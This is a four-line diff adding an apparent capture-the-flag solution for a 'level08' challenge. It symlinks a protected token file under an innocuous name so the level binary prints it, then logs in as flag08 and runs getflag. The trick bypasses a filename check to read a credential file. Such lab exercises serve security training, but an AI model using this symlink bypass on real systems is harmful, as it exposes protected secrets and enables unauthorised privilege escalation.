@@ -1,0 +1,4 @@
+ln -s token soluce
+./level08 soluce
+su flag08
+getflag
